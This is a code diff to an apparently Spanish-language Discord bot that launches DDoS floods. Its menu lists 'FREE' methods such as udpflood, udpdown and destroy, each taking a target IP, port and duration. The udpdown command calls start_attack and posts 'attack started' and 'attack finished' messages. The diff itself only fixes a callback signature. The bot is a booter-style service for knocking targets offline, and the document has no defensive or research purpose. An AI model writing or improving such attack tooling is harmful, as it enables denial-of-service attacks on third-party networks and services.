@@ -54,7 +54,7 @@ async def methods_cmd(ctx):
         "⚙️ Methods",
         """```css
 FREE:
-- udppps <ip> <port> <time> <threads>
+- udppps <ip> <port> <time>
 - udpdown <ip> <port> <time>
 - udpflood <ip> <port> <time>
 - destroy <ip> <port> <time>
@@ -210,16 +210,18 @@ async def udppps_cmd(ctx, ip: str, port: int, duration: int):
 
 @bot.command(name='udpdown')
 async def udpdown_cmd(ctx, ip: str, port: int, duration: int):
-    async def notify_end():
+    async def notify_end(_):  # acepta un argumento
         embed = make_embed("✅ UDPDown terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
         await ctx.send(embed=embed)
 
-    result = start_attack("udpdown", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
-    if result:
-        return await ctx.send(result)
+    start_attack(
+        "udpdown", ip, port, duration,
+        on_finish=lambda result: bot.loop.create_task(notify_end(result))
+    )
+
     embed = make_embed("💣 UDPDown iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
     await ctx.send(embed=embed)
-
+    
 @bot.command(name='udpflood')
 async def udpflood_cmd(ctx, ip: str, port: int, duration: int):
     async def notify_end():
